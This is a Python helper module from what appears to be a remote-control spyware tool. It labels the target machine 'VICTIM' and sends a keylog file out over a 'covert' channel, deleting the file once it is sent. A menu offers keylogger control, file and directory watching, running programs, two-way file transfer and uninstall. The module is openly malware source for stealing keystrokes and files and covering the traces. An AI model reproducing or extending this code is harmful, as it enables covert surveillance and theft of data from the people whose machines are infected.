import socket
import os

def get_ip_address():
    with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as s:
        s.connect(("8.8.8.8", 80))
        name = s.getsockname()[0]
    return name

def transfer_keylog_file(keylogger, covert, file_path):
    if keylogger.get_status():
        print("VICTIM:: Cannot transfer, Keylogger running")
        return 3
    
    if not os.path.exists(file_path):
        print("VICTIM:: keylog.txt does not exist")
        return 3
    
    covert.cmd = 0
    covert.send_data(for_victim=False)
    covert.cmd = None
    covert.file_name = file_path
    covert.send_data(for_victim=False, event="IN_CREATE")
    covert.file_name = None
    os.remove(file_path)

def make_dir(ip_address):
    directory = 'downloads' + '/' + ip_address + "/watching"
    os.makedirs(directory, exist_ok=True)
    
    directory = 'downloads' + '/' + ip_address + "/deleted"
    os.makedirs(directory, exist_ok=True)
    
    return directory

def display_menu():
    print(f"""
          \n-------------- MENU --------------\n
          1. Start Keylogger\n
          2. Stop Keylogger\n
          3. Transfer Keylog File\n
          4. Watch File\n
          5. Stop Watching File\n 
          6. Watch Directory\n
          7. Stop Watching Directory\n
          8. Run Program\n
          9. Transfer File From\n
          10.Transfer File To\n 
          11.Disconnect\n
          12.Uninstall
          """
          )

def check_exists(path):
    if os.path.exists(path):
        return True
    return False